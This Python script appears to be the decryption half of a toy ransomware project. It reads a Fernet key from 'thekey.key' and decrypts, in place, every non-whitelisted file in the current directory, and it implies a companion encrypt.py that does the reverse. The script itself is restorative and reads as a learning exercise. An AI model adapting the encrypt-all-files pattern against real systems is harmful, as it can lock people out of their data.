#!/usr/bin/env python3

# find files 

from asyncio import constants
import os
from cryptography.fernet import Fernet

files = []
decrypt_key = None 

def white_list_files():
    current_filename = __file__.split("/")[-1] 
    white_list = [current_filename, 'readme.md', "thekey.key", "encrypt.py", "requeriments.txt"]
    return white_list 

# Get currently directory and list. 
for file in os.listdir():
    if file in white_list_files():
        continue

    if os.path.isfile(file):
        files.append(file)


with open("thekey.key", "rb") as the_key: 
    decrypt_key = the_key.read()

# Foreach file it will:
for file in files:
    # Open the file like a binary 
    with open(file, "rb") as the_file:
        contents = the_file.read() 

    # decrypt the content
    contents_decrypted = Fernet(decrypt_key).decrypt(contents)

    # Write the content encrypted like a binary. 
    with open(file, "wb") as the_file:
        the_file.write(contents_decrypted) 